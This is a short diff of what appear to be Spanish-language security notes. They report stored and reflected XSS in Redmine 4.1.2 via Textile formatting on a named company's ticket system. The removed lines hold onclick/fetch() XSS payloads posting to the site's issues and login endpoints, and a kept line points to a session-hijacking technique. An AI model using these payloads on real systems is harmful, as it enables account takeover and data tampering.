@@ -105,8 +105,4 @@ My account
 
 Redmine en version 4.1.2 es vulnerable a XSS almacenado y reflejado usando textile formating y backuotes [[XSS-Almacenado en tickets.teknosgroup.com]]
 
-bq:"onclick="fetch('[https://dev.sporte.teknosgroup.com/issues.json',{method:'POST',headers:{'Content-type':'application/json'},body:{key1:'value1',key2:'value2](https://dev.sporte.teknosgroup.com/issues.json',%7Bmethod:'POST',headers:%7B'Content-type':'application/json'%7D,body:%7Bkey1:'value1',key2:'value2)'}};
-
-bq.:"onclick="alert(fetch('[https://dev.soporte.teknosgroup.com/login',{method:'POST](https://dev.soporte.teknosgroup.com/login',%7Bmethod:'POST)'})) ?=?=?????????????
-
 La cookie de la sesión no puede ser exfiltrada directamente pq es HTTP only. Pero hay un posible método detallado en este post [https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81](https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81)
